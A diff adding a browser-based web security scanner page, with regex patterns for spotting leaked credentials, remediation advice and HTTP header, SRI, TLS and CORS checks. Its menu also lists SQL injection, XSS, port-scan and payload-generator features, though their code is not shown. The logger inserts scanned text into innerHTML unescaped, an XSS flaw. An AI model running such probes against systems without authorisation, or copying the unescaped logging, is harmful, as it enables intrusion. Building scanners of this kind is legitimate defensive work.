@@ -1,0 +1,1451 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Enhanced Frontend Web Security Scanner</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 25px;
+            background: #0a0a0a;
+            color: #e0e0e0;
+            line-height: 1.6;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 20px auto;
+            background: linear-gradient(135deg, #1e1e1e 0%, #2a2a2a 100%);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 255, 0, 0.1);
+            border: 1px solid #00ff00;
+        }
+        h1 {
+            color: #00ff00;
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 2.8em;
+            text-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { text-shadow: 0 0 15px rgba(0, 255, 0, 0.5); }
+            50% { text-shadow: 0 0 25px rgba(0, 255, 0, 0.8); }
+            100% { text-shadow: 0 0 15px rgba(0, 255, 0, 0.5); }
+        }
+        .section {
+            background: rgba(42, 42, 42, 0.8);
+            padding: 25px;
+            border-radius: 12px;
+            margin-bottom: 25px;
+            border: 1px solid #444;
+            backdrop-filter: blur(10px);
+        }
+        .section h2 {
+            color: #00ffff;
+            margin-top: 0;
+            margin-bottom: 15px;
+            font-size: 1.8em;
+            border-bottom: 2px solid #00ffff;
+            padding-bottom: 10px;
+        }
+        .tab-container {
+            display: flex;
+            margin-bottom: 20px;
+            border-bottom: 2px solid #333;
+        }
+        .tab {
+            background: #333;
+            color: #ccc;
+            border: none;
+            padding: 12px 20px;
+            cursor: pointer;
+            margin-right: 5px;
+            border-radius: 8px 8px 0 0;
+            transition: all 0.3s ease;
+        }
+        .tab.active {
+            background: #00ff00;
+            color: #000;
+            transform: translateY(-2px);
+        }
+        .tab-content {
+            display: none;
+        }
+        .tab-content.active {
+            display: block;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #b0b0b0;
+        }
+        input[type="text"], textarea, select {
+            width: calc(100% - 22px);
+            padding: 11px;
+            margin-bottom: 18px;
+            border: 1px solid #555;
+            border-radius: 6px;
+            background: #1a1a1a;
+            color: #f0f0f0;
+            font-size: 1em;
+            box-sizing: border-box;
+        }
+        textarea {
+            min-height: 120px;
+            resize: vertical;
+            font-family: 'Courier New', monospace;
+        }
+        button {
+            background: linear-gradient(45deg, #2196F3, #00bcd4);
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 1em;
+            margin-right: 10px;
+            margin-bottom: 10px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(33, 150, 243, 0.3);
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(33, 150, 243, 0.4);
+        }
+        button.danger { 
+            background: linear-gradient(45deg, #f44336, #ff5722);
+            box-shadow: 0 4px 15px rgba(244, 67, 54, 0.3);
+        }
+        button.success { 
+            background: linear-gradient(45deg, #4CAF50, #8BC34A);
+            box-shadow: 0 4px 15px rgba(76, 175, 80, 0.3);
+        }
+        button.warning {
+            background: linear-gradient(45deg, #ff9800, #ffc107);
+            box-shadow: 0 4px 15px rgba(255, 152, 0, 0.3);
+        }
+        .progress-bar {
+            width: 100%;
+            height: 20px;
+            background: #333;
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 10px 0;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(45deg, #00ff00, #00ffff);
+            width: 0%;
+            transition: width 0.3s ease;
+            animation: shimmer 1.5s infinite;
+        }
+        @keyframes shimmer {
+            0% { background-position: -200px 0; }
+            100% { background-position: calc(200px + 100%) 0; }
+        }
+        #resultsLog {
+            margin-top: 25px;
+            padding: 20px;
+            background: #0a0a0a;
+            border-radius: 10px;
+            border: 1px solid #00ff00;
+            max-height: 600px;
+            overflow-y: auto;
+            font-family: 'Fira Code', 'Courier New', monospace;
+            font-size: 0.9em;
+            box-shadow: inset 0 0 20px rgba(0, 255, 0, 0.1);
+        }
+        .log-entry {
+            margin-bottom: 8px;
+            padding: 8px;
+            border-radius: 5px;
+            word-wrap: break-word;
+            display: flex;
+            align-items: flex-start;
+            animation: fadeIn 0.5s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .log-icon {
+            font-size: 1.2em;
+            margin-right: 8px;
+            min-width: 20px;
+        }
+        .info { background: rgba(0, 255, 255, 0.1); color: #00ffff; border-left: 3px solid #00ffff; }
+        .success { background: rgba(0, 255, 0, 0.1); color: #00ff00; border-left: 3px solid #00ff00; }
+        .warning { background: rgba(255, 193, 7, 0.1); color: #ffc107; border-left: 3px solid #ffc107; }
+        .error { background: rgba(244, 67, 54, 0.1); color: #ff5555; border-left: 3px solid #ff5555; }
+        .critical { 
+            background: rgba(255, 0, 0, 0.2); 
+            color: #ff0000; 
+            border: 2px solid #ff0000; 
+            font-weight: bold;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0.7; }
+        }
+        .found-secret {
+            background: linear-gradient(45deg, #ff9800, #ffc107);
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-weight: bold;
+            color: #000;
+            box-shadow: 0 2px 8px rgba(255, 152, 0, 0.3);
+        }
+        .stats-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        .stat-card {
+            background: rgba(0, 255, 0, 0.1);
+            border: 1px solid #00ff00;
+            border-radius: 8px;
+            padding: 15px;
+            text-align: center;
+        }
+        .stat-number {
+            font-size: 2em;
+            font-weight: bold;
+            color: #00ff00;
+        }
+        .stat-label {
+            color: #ccc;
+            margin-top: 5px;
+        }
+        .export-section {
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 8px;
+            border: 1px solid #333;
+        }
+        .disclaimer {
+            font-size: 0.85em;
+            color: #888;
+            margin-top: 30px;
+            text-align: center;
+            padding: 15px;
+            background: rgba(255, 0, 0, 0.1);
+            border: 1px solid #ff0000;
+            border-radius: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🛡️ Advanced Web Security Scanner v2.0</h1>
+        <p style="text-align: center; color: #00ffff;">Professional Security Assessment Tool by mon3m</p>
+
+        <div class="stats-container">
+            <div class="stat-card">
+                <div class="stat-number" id="totalScans">0</div>
+                <div class="stat-label">Total Scans</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="criticalFindings">0</div>
+                <div class="stat-label">Critical Issues</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="secretsFound">0</div>
+                <div class="stat-label">Secrets Found</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="scanTime">0s</div>
+                <div class="stat-label">Last Scan Time</div>
+            </div>
+        </div>
+
+        <div class="progress-bar" id="progressBar" style="display: none;">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+
+        <div class="tab-container">
+            <button class="tab active" onclick="switchTab('url-scan', event)">🌐 URL Scanner</button>
+            <button class="tab" onclick="switchTab('secret-scan', event)">🔑 Secret Scanner</button>
+            <button class="tab" onclick="switchTab('advanced-scan', event)">⚡ Advanced Tools</button>
+            <button class="tab" onclick="switchTab('payload-gen', event)">💥 Payload Generator</button>
+        </div>
+
+        <div id="url-scan" class="tab-content active">
+            <div class="section">
+                <h2>🌍 Target URL Analysis</h2>
+                <label for="targetUrl">Enter Target URL:</label>
+                <input type="text" id="targetUrl" placeholder="https://example.com">
+                <label for="scanDepth">Scan Depth:</label>
+                <select id="scanDepth">
+                    <option value="basic">Basic Scan</option>
+                    <option value="deep">Deep Scan</option>
+                    <option value="comprehensive">Comprehensive Scan</option>
+                </select>
+                <button onclick="startComprehensiveScan()" class="success">🚀 Start Full Scan</button>
+                <button onclick="startSubdomainEnum()" class="warning">🔍 Subdomain Enum</button>
+                <button onclick="clearLogs()" class="danger">🗑️ Clear Logs</button>
+            </div>
+        </div>
+
+        <div id="secret-scan" class="tab-content">
+            <div class="section">
+                <h2>🔑 Advanced Secret Detection</h2>
+                <label for="scanContent">Paste Code/Text/URLs for Analysis:</label>
+                <textarea id="scanContent" placeholder="Paste your code, config files, or multiple URLs (one per line)"></textarea>
+                <label for="secretSensitivity">Detection Sensitivity:</label>
+                <select id="secretSensitivity">
+                    <option value="low">Low (High Confidence Only)</option>
+                    <option value="medium" selected>Medium (Balanced)</option>
+                    <option value="high">High (All Potential Secrets)</option>
+                </select>
+                <button onclick="startAdvancedSecretScan()" class="success">🔍 Advanced Secret Scan</button>
+                <button onclick="batchUrlScan()" class="warning">📋 Batch URL Scan</button>
+            </div>
+        </div>
+
+        <div id="advanced-scan" class="tab-content">
+            <div class="section">
+                <h2>⚡ Advanced Security Tools</h2>
+                <label for="customHeaders">Custom Headers (JSON format):</label>
+                <textarea id="customHeaders" placeholder='{"Authorization": "Bearer token", "X-Custom": "value"}'></textarea>
+                <label for="userAgent">Custom User Agent:</label>
+                <input type="text" id="userAgent" placeholder="Mozilla/5.0... (leave empty for default)">
+                <button onclick="testSqlInjection()" class="warning">💉 SQL Injection Test</button>
+                <button onclick="testXss()" class="warning">🔥 XSS Test</button>
+                <button onclick="testClickjacking()" class="warning">🎯 Clickjacking Test</button>
+                <button onclick="portScan()" class="danger">🔌 Port Scan</button>
+            </div>
+        </div>
+
+        <div id="payload-gen" class="tab-content">
+            <div class="section">
+                <h2>💥 Security Payload Generator</h2>
+                <label for="payloadType">Payload Type:</label>
+                <select id="payloadType">
+                    <option value="xss">XSS Payloads</option>
+                    <option value="sqli">SQL Injection</option>
+                    <option value="lfi">Local File Inclusion</option>
+                    <option value="rfi">Remote File Inclusion</option>
+                    <option value="xxe">XXE Payloads</option>
+                    <option value="ssrf">SSRF Payloads</option>
+                </select>
+                <label for="encoding">Encoding:</label>
+                <select id="encoding">
+                    <option value="none">None</option>
+                    <option value="url">URL Encoding</option>
+                    <option value="html">HTML Encoding</option>
+                    <option value="base64">Base64</option>
+                </select>
+                <button onclick="generatePayloads()" class="success">🎯 Generate Payloads</button>
+                <button onclick="testGenerated()" class="warning">🧪 Test Generated</button>
+            </div>
+        </div>
+
+        <div class="export-section">
+            <h3>📊 Export Results</h3>
+            <button onclick="exportResults('json')" class="success">📄 Export JSON</button>
+            <button onclick="exportResults('csv')" class="success">📊 Export CSV</button>
+            <button onclick="exportResults('pdf')" class="success">📋 Export PDF Report</button>
+            <button onclick="shareResults()" class="warning">🔗 Generate Shareable Link</button>
+        </div>
+
+        <div id="resultsLog">
+            <div class="log-entry info">
+                <span class="log-icon">🛡️</span> 
+                Advanced Security Scanner initialized. Ready for professional security assessments.
+            </div>
+        </div>
+
+        <div class="disclaimer">
+            <p><strong>⚠️ LEGAL DISCLAIMER:</strong> This tool is for authorized security testing only. Use only on systems you own or have explicit written permission to test. Unauthorized testing is illegal and unethical.</p>
+            <p><strong>🔧 Enhanced by mon3m</strong> - Professional Cybersecurity Tools for Ethical Hackers</p>
+        </div>
+    </div>
+
+    <script>
+        const resultsLog = document.getElementById('resultsLog');
+        let scanStats = {
+            totalScans: 0,
+            criticalFindings: 0,
+            secretsFound: 0,
+            scanStartTime: 0
+        };
+        let allFindings = [];
+
+        // Enhanced logging with statistics
+        function log(message, type = 'info') {
+            const entry = document.createElement('div');
+            const iconMap = {
+                'info': '💡',
+                'success': '✅',
+                'warning': '⚠️',
+                'error': '❌',
+                'critical': '🚨'
+            };
+            
+            entry.className = `log-entry ${type}`;
+            entry.innerHTML = `<span class="log-icon">${iconMap[type] || '📄'}</span> ${message}`;
+            resultsLog.appendChild(entry);
+            resultsLog.scrollTop = resultsLog.scrollHeight;
+            
+            // Update statistics
+            if (type === 'critical') {
+                scanStats.criticalFindings++;
+            } else if (type === 'warning') {
+                // You might want to count warnings as well or other categories
+            }
+            updateStats();
+            
+            // Store finding for export
+            allFindings.push({
+                timestamp: new Date().toISOString(),
+                type: type,
+                message: message.replace(/<[^>]*>/g, ''), // Remove HTML tags for plain text export
+                severity: type
+            });
+            
+            console.log(`[${type.toUpperCase()}] ${message.replace(/<[^>]*>/g, '')}`);
+        }
+
+        function updateStats() {
+            document.getElementById('totalScans').textContent = scanStats.totalScans;
+            document.getElementById('criticalFindings').textContent = scanStats.criticalFindings;
+            document.getElementById('secretsFound').textContent = scanStats.secretsFound;
+            
+            if (scanStats.scanStartTime > 0 && document.getElementById('progressBar').style.display === 'none') {
+                const elapsed = Math.round((Date.now() - scanStats.scanStartTime) / 1000);
+                document.getElementById('scanTime').textContent = elapsed + 's';
+            } else if (scanStats.scanStartTime === 0) {
+                document.getElementById('scanTime').textContent = '0s';
+            }
+        }
+
+        function showProgress(show = true) {
+            const progressBar = document.getElementById('progressBar');
+            progressBar.style.display = show ? 'block' : 'none';
+            if (show) {
+                scanStats.scanStartTime = Date.now();
+                updateStats(); // Start timer
+            } else {
+                updateStats(); // Final update of scan time
+            }
+        }
+
+        function updateProgress(percentage) {
+            const progressFill = document.getElementById('progressFill');
+            progressFill.style.width = percentage + '%';
+        }
+
+        function switchTab(tabName, event) {
+            // Hide all tab contents
+            document.querySelectorAll('.tab-content').forEach(content => {
+                content.classList.remove('active');
+            });
+            
+            // Remove active class from all tabs
+            document.querySelectorAll('.tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            
+            // Show selected tab content
+            document.getElementById(tabName).classList.add('active');
+            
+            // Add active class to clicked tab
+            if (event && event.target) {
+                event.target.classList.add('active');
+            }
+        }
+
+        function clearLogs() {
+            resultsLog.innerHTML = `<div class="log-entry info"><span class="log-icon">🛡️</span> Logs cleared. Scanner ready for new assessments.</div>`;
+            allFindings = [];
+            scanStats = { totalScans: 0, criticalFindings: 0, secretsFound: 0, scanStartTime: 0 };
+            updateStats();
+        }
+
+        // Enhanced secret patterns with more comprehensive detection
+        const enhancedSecretPatterns = [
+            // API Keys
+            { name: "Generic API Key", regex: /(?:api[_-]?key|apikey|api[_-]?secret|access[_-]?token|auth[_-]?token|secret[_-]?key|private[_-]?key|client[_-]?secret|app[_-]?secret)[\s:=_-]*['"`]?([a-zA-Z0-9_\-]{16,128})['"`]?/gim, severity: 'warning' },
+            
+            // Cloud Providers
+            { name: "AWS Access Key ID", regex: /AKIA[0-9A-Z]{16}/g, severity: 'critical' },
+            { name: "AWS Secret Access Key", regex: /[A-Za-z0-9/+=]{40}/g, severity: 'critical' },
+            { name: "Google API Key", regex: /AIza[0-9A-Za-z_-]{35}/g, severity: 'critical' },
+            { name: "Azure Subscription Key", regex: /[0-9a-f]{32}/g, severity: 'warning' },
+            
+            // Payment & Services
+            { name: "Stripe API Key", regex: /sk_live_[0-9a-zA-Z]{24}/g, severity: 'critical' },
+            { name: "PayPal Client ID", regex: /A[A-Za-z0-9_-]{79}/g, severity: 'critical' },
+            
+            // Version Control
+            { name: "GitHub Personal Access Token", regex: /ghp_[0-9a-zA-Z]{36}/g, severity: 'critical' },
+            { name: "GitLab Personal Access Token", regex: /glpat-[0-9A-Za-z_-]{20}/g, severity: 'critical' },
+            
+            // Database
+            { name: "MongoDB Connection String", regex: /mongodb(\+srv)?:\/\/[^\s]+/gi, severity: 'critical' },
+            { name: "MySQL Connection String", regex: /mysql:\/\/[^\s]+/gi, severity: 'critical' },
+            { name: "PostgreSQL Connection String", regex: /postgres(ql)?:\/\/[^\s]+/gi, severity: 'critical' },
+            
+            // Authentication
+            { name: "JWT Token", regex: /eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*/g, severity: 'warning' },
+            { name: "Basic Auth", regex: /(?:Authorization|authorization)[\s:=]+Basic\s+([A-Za-z0-9+/=]+)/g, severity: 'critical' },
+            
+            // Private Keys
+            { name: "RSA Private Key", regex: /-----BEGIN RSA PRIVATE KEY-----[\s\S]*?-----END RSA PRIVATE KEY-----/g, severity: 'critical' },
+            { name: "OpenSSH Private Key", regex: /-----BEGIN OPENSSH PRIVATE KEY-----[\s\S]*?-----END OPENSSH PRIVATE KEY-----/g, severity: 'critical' },
+            { name: "PGP Private Key", regex: /-----BEGIN PGP PRIVATE KEY BLOCK-----[\s\S]*?-----END PGP PRIVATE KEY BLOCK-----/g, severity: 'critical' },
+            
+            // Passwords
+            { name: "Password", regex: /(?:password|passwd|pass|pwd)[\s:=_-]*['"`]?([^\s'"`]{6,50})['"`]?/gim, severity: 'critical' },
+            
+            // Communication Services
+            { name: "Slack Webhook", regex: /https:\/\/hooks\.slack\.com\/services\/T[a-zA-Z0-9_]+\/B[a-zA-Z0-9_]+\/[a-zA-Z0-9_]+/g, severity: 'critical' },
+            { name: "Discord Webhook", regex: /https:\/\/discord(?:app)?\.com\/api\/webhooks\/[0-9]+\/[A-Za-z0-9_-]+/g, severity: 'critical' },
+            
+            // Phone Services
+            { name: "Twilio Account SID", regex: /AC[a-zA-Z0-9]{32}/g, severity: 'critical' },
+            { name: "Twilio Auth Token", regex: /SK[a-zA-Z0-9]{32}/g, severity: 'critical' }
+        ];
+
+        async function startAdvancedSecretScan() {
+            const content = document.getElementById('scanContent').value;
+            const sensitivity = document.getElementById('secretSensitivity').value;
+            
+            scanStats.scanStartTime = Date.now();
+            scanStats.totalScans++;
+            scanStats.secretsFound = 0; // Reset secrets found for this scan
+            showProgress(true);
+            updateProgress(0);
+            
+            log('🔍 Starting Advanced Secret Detection Scan...', 'info');
+            
+            if (!content.trim()) {
+                log('❌ No content provided for scanning.', 'error');
+                showProgress(false);
+                return;
+            }
+            
+            let foundCount = 0;
+            const patterns = enhancedSecretPatterns;
+            
+            for (let i = 0; i < patterns.length; i++) {
+                const pattern = patterns[i];
+                updateProgress(((i + 1) / patterns.length) * 100);
+                
+                let match;
+                while ((match = pattern.regex.exec(content)) !== null) {
+                    // Apply sensitivity filter
+                    if (sensitivity === 'low' && (pattern.severity === 'warning' || pattern.severity === 'info')) {
+                        continue; // Skip less critical findings for low sensitivity
+                    }
+                    if (sensitivity === 'medium' && pattern.severity === 'info') {
+                        continue; // Skip info findings for medium sensitivity
+                    }
+
+                    foundCount++;
+                    scanStats.secretsFound++;
+                    
+                    const secret = match[0];
+                    const displayedSecret = secret.length > 70 ? 
+                        secret.substring(0, 25) + '...' + secret.substring(secret.length - 25) : 
+                        secret;
+                    
+                    log(`🔑 <span class="${pattern.severity}">[${pattern.severity.toUpperCase()}] ${pattern.name}</span>: <span class="found-secret">${displayedSecret}</span>`, pattern.severity);
+                    
+                    // Add remediation advice
+                    const remediation = getRemediationAdvice(pattern.name);
+                    if (remediation) {
+                        log(`💡 <strong>Remediation:</strong> ${remediation}`, 'info');
+                    }
+                }
+            }
+            
+            updateProgress(100);
+            setTimeout(() => showProgress(false), 1000);
+            
+            if (foundCount === 0) {
+                log('✅ No secrets detected in the provided content.', 'success');
+            } else {
+                log(`🚨 Secret scan completed. Found ${foundCount} potential secrets requiring immediate attention.`, 'critical');
+            }
+            
+            updateStats();
+        }
+
+        function getRemediationAdvice(secretType) {
+            const advice = {
+                "AWS Access Key ID": "Immediately rotate AWS credentials, review CloudTrail logs, and implement IAM best practices (e.g., least privilege, multi-factor authentication).",
+                "AWS Secret Access Key": "Immediately rotate AWS credentials, review CloudTrail logs, and implement IAM best practices (e.g., least privilege, multi-factor authentication).",
+                "Google API Key": "Restrict API key usage to specific APIs and IP addresses. Regenerate if exposed.",
+                "Azure Subscription Key": "Rotate keys immediately. Store keys securely in Azure Key Vault or similar service.",
+                "Stripe API Key": "Rotate Stripe keys, review transaction logs, and implement webhook signing verification. Never expose secret keys in frontend code.",
+                "PayPal Client ID": "Ensure this is a public client ID. If a secret, rotate it and store securely.",
+                "GitHub Personal Access Token": "Revoke token immediately, check repository access logs, and regenerate with minimal permissions (granular tokens).",
+                "GitLab Personal Access Token": "Revoke token immediately, check repository access logs, and regenerate with minimal permissions.",
+                "MongoDB Connection String": "Change database credentials, restrict network access to trusted IPs, and ensure authentication is enabled. Use environment variables or secret management.",
+                "MySQL Connection String": "Change database credentials, restrict network access, and avoid hardcoding credentials. Use secure configuration management.",
+                "PostgreSQL Connection String": "Change database credentials, restrict network access, and avoid hardcoding credentials. Use secure configuration management.",
+                "JWT Token": "Invalidate current tokens, implement proper token rotation, and use short expiration times. Store tokens securely (e.g., HttpOnly cookies for refresh tokens).",
+                "Basic Auth": "Change credentials immediately. Use more secure authentication mechanisms like OAuth2 or API keys with proper access controls.",
+                "RSA Private Key": "Immediately revoke and generate new keys. Ensure private keys are never committed to public repositories or exposed in frontend code.",
+                "OpenSSH Private Key": "Immediately revoke and generate new keys. Ensure private keys are never committed to public repositories or exposed in frontend code.",
+                "PGP Private Key": "Immediately revoke and generate new keys. Ensure private keys are never committed to public repositories or exposed in frontend code.",
+                "Password": "Change password immediately, enable 2FA for all accounts, and avoid hardcoding credentials or storing them in plaintext.",
+                "Slack Webhook": "Regenerate webhook URL, review message history for sensitive data, and implement proper access controls or alternative secure communication methods.",
+                "Discord Webhook": "Regenerate webhook URL, review message history for sensitive data, and implement proper access controls.",
+                "Twilio Account SID": "Rotate Twilio credentials. Store securely and restrict access.",
+                "Twilio Auth Token": "Rotate Twilio credentials. Store securely and restrict access.",
+                "Generic API Key": "Investigate the service associated with this key. Rotate the key and store it securely (e.g., environment variables, secret management systems)."
+            };
+            return advice[secretType] || "Review exposure: This secret should not be publicly accessible. Rotate and store securely.";
+        }
+
+        async function startComprehensiveScan() {
+            const url = document.getElementById('targetUrl').value.trim();
+            const depth = document.getElementById('scanDepth').value;
+            
+            if (!url) {
+                log('❌ Please enter a target URL.', 'error');
+                return;
+            }
+            
+            scanStats.scanStartTime = Date.now();
+            scanStats.totalScans++;
+            showProgress(true);
+            
+            log(`🚀 Starting ${depth} security assessment for: ${url}`, 'info');
+            
+            const scanTasks = [
+                () => scanHttpHeaders(url),
+                () => scanCors(url),
+                () => scanRobotsAndSitemap(url),
+                () => scanSslTls(url),
+                () => scanSubresourceIntegrity(url)
+            ];
+            
+            if (depth === 'deep' || depth === 'comprehensive') {
+                scanTasks.push(() => scanContentSecurityPolicy(url));
+                scanTasks.push(() => scanCookieSecurity(url));
+            }
+            
+            if (depth === 'comprehensive') {
+                scanTasks.push(() => scanDirectoryTraversal(url));
+                scanTasks.push(() => scanOpenRedirect(url));
+            }
+            
+            for (let i = 0; i < scanTasks.length; i++) {
+                updateProgress((i / scanTasks.length) * 100);
+                await scanTasks[i]();
+                await new Promise(resolve => setTimeout(resolve, 500)); // Throttle requests
+            }
+            
+            updateProgress(100);
+            setTimeout(() => showProgress(false), 1000);
+            log('✅ Comprehensive security scan completed.', 'success');
+            updateStats();
+        }
+
+        async function scanSslTls(url) {
+            log('🔒 Analyzing SSL/TLS Configuration...', 'info');
+            
+            try {
+                const response = await fetch(url, { method: 'HEAD' });
+                const protocol = new URL(url).protocol;
+                
+                if (protocol === 'http:') {
+                    log('🚨 [CRITICAL] Site uses HTTP instead of HTTPS. All traffic is unencrypted and vulnerable to eavesdropping.', 'critical');
+                } else {
+                    log('✅ Site uses HTTPS protocol.', 'success');
+                    
+                    // Check HSTS header
+                    const hsts = response.headers.get('strict-transport-security');
+                    if (!hsts) {
+                        log('⚠️ [WARNING] Missing Strict-Transport-Security (HSTS) header. This could allow downgrade attacks (SSL stripping).', 'warning');
+                    } else {
+                        log(`✅ HSTS header present: <code>${hsts}</code>`, 'success');
+                        if (!hsts.includes('includeSubDomains') || !hsts.includes('preload')) {
+                            log('💡 [INFO] HSTS header is present but consider adding `includeSubDomains` and `preload` directives for enhanced security.', 'info');
+                        }
+                    }
+                }
+            } catch (error) {
+                log(`❌ SSL/TLS scan failed: ${error.message}. Could not reach target or invalid URL.`, 'error');
+            }
+        }
+
+        async function scanSubresourceIntegrity(url) {
+            log('🔗 Checking Subresource Integrity (SRI)...', 'info');
+            
+            try {
+                const response = await fetch(url);
+                if (!response.ok) {
+                    log(`❌ Failed to fetch content for SRI scan: ${response.status} ${response.statusText}`, 'error');
+                    return;
+                }
+                const html = await response.text();
+                const parser = new DOMParser();
+                const doc = parser.parseFromString(html, 'text/html');
+
+                let sriFound = 0;
+                let sriMissing = 0;
+
+                // Check <script> tags
+                doc.querySelectorAll('script[src]').forEach(script => {
+                    if (script.getAttribute('integrity')) {
+                        sriFound++;
+                    } else {
+                        sriMissing++;
+                        log(`⚠️ [WARNING] Script missing SRI: <code>${script.src}</code>. Consider adding 'integrity' attribute.`, 'warning');
+                    }
+                });
+
+                // Check <link rel="stylesheet"> tags
+                doc.querySelectorAll('link[rel="stylesheet"][href]').forEach(link => {
+                    if (link.getAttribute('integrity')) {
+                        sriFound++;
+                    } else {
+                        sriMissing++;
+                        log(`⚠️ [WARNING] Stylesheet missing SRI: <code>${link.href}</code>. Consider adding 'integrity' attribute.`, 'warning');
+                    }
+                });
+
+                if (sriFound === 0 && sriMissing === 0) {
+                    log('💡 [INFO] No external scripts or stylesheets found to check for SRI.', 'info');
+                } else if (sriMissing === 0) {
+                    log('✅ All detected external scripts and stylesheets have Subresource Integrity (SRI) attributes.', 'success');
+                } else {
+                    log(`⚠️ [WARNING] Found ${sriMissing} external resources missing Subresource Integrity (SRI) attributes. Total: ${sriFound + sriMissing}.`, 'warning');
+                    log('💡 <strong>Remediation:</strong> Implement Subresource Integrity for all third-party scripts and stylesheets to prevent tampering.', 'info');
+                }
+            } catch (error) {
+                log(`❌ SRI scan failed: ${error.message}`, 'error');
+            }
+        }
+
+        async function scanHttpHeaders(url) {
+            log('📄 Analyzing HTTP Security Headers...', 'info');
+            try {
+                const response = await fetch(url, { method: 'HEAD' });
+                const headers = response.headers;
+
+                const securityHeaders = {
+                    'X-Content-Type-Options': 'nosniff',
+                    'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
+                    'X-XSS-Protection': '1; mode=block',
+                    'Content-Security-Policy': null, // Checked separately in scanContentSecurityPolicy
+                    'Referrer-Policy': ['no-referrer', 'no-referrer-when-downgrade', 'same-origin', 'strict-origin', 'strict-origin-when-cross-origin'],
+                    'Permissions-Policy': null, // Formerly Feature-Policy
+                    'Cross-Origin-Opener-Policy': ['same-origin', 'same-origin-allow-popups', 'unsafe-none'],
+                    'Cross-Origin-Embedder-Policy': ['require-corp', 'credentialless', 'unsafe-none']
+                };
+
+                let missingCount = 0;
+
+                for (const headerName in securityHeaders) {
+                    const expectedValue = securityHeaders[headerName];
+                    const actualValue = headers.get(headerName.toLowerCase());
+
+                    if (headerName === 'Content-Security-Policy') {
+                        // CSP is handled by scanContentSecurityPolicy
+                        continue;
+                    }
+
+                    if (headerName === 'Permissions-Policy' && !actualValue) {
+                         // Check for old Feature-Policy
+                        const featurePolicy = headers.get('feature-policy');
+                        if (featurePolicy) {
+                            log(`✅ Header found: <code>Feature-Policy: ${featurePolicy}</code> (Deprecated, consider Permissions-Policy)`, 'success');
+                        } else {
+                            log(`⚠️ [WARNING] Missing <code>${headerName}</code> header.`, 'warning');
+                            log(`💡 <strong>Remediation:</strong> Add <code>${headerName}</code> to control browser features.`, 'info');
+                            missingCount++;
+                        }
+                    } else if (actualValue) {
+                        if (Array.isArray(expectedValue)) {
+                            if (expectedValue.some(val => actualValue.toLowerCase().includes(val.toLowerCase()))) {
+                                log(`✅ Header found: <code>${headerName}: ${actualValue}</code>`, 'success');
+                            } else {
+                                log(`⚠️ [WARNING] <code>${headerName}</code> header found but value is not optimal: <code>${actualValue}</code>. Expected one of: ${expectedValue.join(', ')}.`, 'warning');
+                                missingCount++;
+                            }
+                        } else if (expectedValue && !actualValue.toLowerCase().includes(expectedValue.toLowerCase())) {
+                            log(`⚠️ [WARNING] <code>${headerName}</code> header found but value is not optimal: <code>${actualValue}</code>. Expected: <code>${expectedValue}</code>.`, 'warning');
+                            missingCount++;
+                        } else {
+                            log(`✅ Header found: <code>${headerName}: ${actualValue}</code>`, 'success');
+                        }
+                    } else {
+                        log(`⚠️ [WARNING] Missing <code>${headerName}</code> header.`, 'warning');
+                        let remediation = '';
+                        if (headerName === 'X-Content-Type-Options') remediation = 'Prevents MIME sniffing attacks.';
+                        if (headerName === 'X-Frame-Options') remediation = 'Prevents Clickjacking attacks.';
+                        if (headerName === 'X-XSS-Protection') remediation = 'Enables built-in XSS protection (though CSP is preferred).';
+                        if (headerName === 'Referrer-Policy') remediation = 'Controls how much referrer information is sent with requests.';
+                        if (headerName === 'Cross-Origin-Opener-Policy') remediation = 'Isolate your document from potentially malicious cross-origin documents.';
+                        if (headerName === 'Cross-Origin-Embedder-Policy') remediation = 'Controls resources that can be loaded across origins.';
+                        
+                        if (remediation) {
+                            log(`💡 <strong>Remediation:</strong> Add <code>${headerName}</code> header. ${remediation}`, 'info');
+                        }
+                        missingCount++;
+                    }
+                }
+                if (missingCount === 0) {
+                    log('✅ All essential HTTP security headers are present and configured optimally.', 'success');
+                } else {
+                    log(`🚨 HTTP Security Header scan completed. Found ${missingCount} missing or suboptimal headers.`, 'critical');
+                }
+            } catch (error) {
+                log(`❌ HTTP Header scan failed: ${error.message}`, 'error');
+            }
+        }
+
+        async function scanCors(url) {
+            log('🌐 Analyzing Cross-Origin Resource Sharing (CORS) Configuration...', 'info');
+            try {
+                const response = await fetch(url, { method: 'HEAD' });
+                const headers = response.headers;
+                const acao = headers.get('access-control-allow-origin');
+
+                if (acao) {
+                    if (acao === '*') {
+                        log('🚨 [CRITICAL] Wildcard <code>Access-Control-Allow-Origin: *</code> detected. This allows any domain to access resources and might lead to data leakage if sensitive data is exposed.', 'critical');
